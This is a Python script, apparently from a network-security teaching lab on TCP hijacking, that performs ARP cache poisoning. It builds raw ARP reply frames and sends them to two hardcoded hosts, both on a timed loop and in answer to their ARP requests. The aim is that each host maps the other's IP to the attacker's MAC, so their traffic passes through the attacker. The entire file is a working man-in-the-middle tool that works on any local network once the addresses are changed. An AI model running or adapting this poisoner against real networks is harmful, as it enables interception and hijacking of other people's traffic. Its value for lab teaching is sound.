#!/usr/bin/env python3
"""Reliable ARP spoofing for the TCP hijacking labs.

The attacker answers ARP requests for the victim/server immediately and also
sends periodic gratuitous replies, so the victim and server keep the attacker
MAC in their neighbour caches.

Usage:  sudo ./arp-poison [iface]
"""

import socket
import struct
import sys
import threading
import time

# claimed_ip -> list of hosts that should believe claimed_ip is at our MAC
CLAIMS = {
    '172.21.0.3': ['172.21.0.2'],   # victim thinks the server is us
    '172.21.0.2': ['172.21.0.3'],   # server thinks the victim is us
}


def get_mac(iface):
    with open('/sys/class/net/%s/address' % iface) as fh:
        return fh.read().strip()


def mac_bytes(text):
    return b''.join(bytes([int(part, 16)]) for part in text.split(':'))


def make_reply(claimed_ip, dst_ip, mymac, dst_mac):
    eth = struct.pack('!6s6sH', dst_mac, mymac, 0x0806)
    arp = struct.pack('!HHBBH6s4s6s4s', 1, 0x0800, 6, 4, 2,
                      mymac, socket.inet_aton(claimed_ip),
                      dst_mac, socket.inet_aton(dst_ip))
    return eth + arp


def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else 'eth0'
    mymac = mac_bytes(get_mac(iface))
    bcast = mac_bytes('ff:ff:ff:ff:ff:ff')
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((iface, 0))
    print('ARP poisoning on %s, attacker MAC %s' % (iface, get_mac(iface)), flush=True)

    def sender():
        while True:
            for claimed, victims in CLAIMS.items():
                for victim in victims:
                    sock.send(make_reply(claimed, victim, mymac, bcast))
            time.sleep(0.5)

    threading.Thread(target=sender, daemon=True).start()

    while True:
        frame = sock.recv(2048)
        if len(frame) < 42:
            continue
        if struct.unpack('!H', frame[12:14])[0] != 0x0806:
            continue
        fields = struct.unpack('!HHBBH6s4s6s4s', frame[14:42])
        op, sha, spa, tpa = fields[4], fields[5], fields[6], fields[8]
        if op != 1:
            continue
        claimed = socket.inet_ntoa(tpa)
        asker = socket.inet_ntoa(spa)
        if claimed in CLAIMS and asker in CLAIMS[claimed]:
            sock.send(make_reply(claimed, asker, mymac, sha))


if __name__ == '__main__':
    main()
